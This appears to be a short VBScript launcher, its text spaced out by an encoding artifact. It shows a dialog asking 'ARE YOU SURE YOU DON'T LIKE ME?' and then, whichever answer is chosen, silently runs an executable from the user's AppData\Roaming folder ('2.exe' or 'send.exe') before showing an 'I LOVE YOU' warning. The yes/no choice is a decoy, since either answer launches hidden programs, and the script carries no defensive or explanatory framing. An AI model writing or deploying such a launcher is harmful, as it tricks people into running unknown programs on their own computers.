S e t   o S h e l l   =   C r e a t e O b j e c t   ( " W S c r i p t . S h e l l " )    
  
 i n t A n s w e r   =   _  
         M s g b o x ( " A R E   Y O U   S U R E   Y O U   D O N ' T   L I K E   M E ? " ,   _  
                 v b Y e s N o ,   " Q U E S T I O N " )  
 I f   i n t A n s w e r   =   v b Y e s   T h e n  
         o S h e l l . r u n   " % u s e r p r o f i l e % / A p p D a t a / R o a m i n g / 2 . e x e "  
 E l s e  
         o S h e l l . r u n   " % u s e r p r o f i l e % / A p p D a t a / R o a m i n g / s e n d . e x e "  
 	 X = M s g B o x ( " I   L O V E   Y O U " , 0 + 4 8 , " W A R N I N G " )  
 E n d   I f 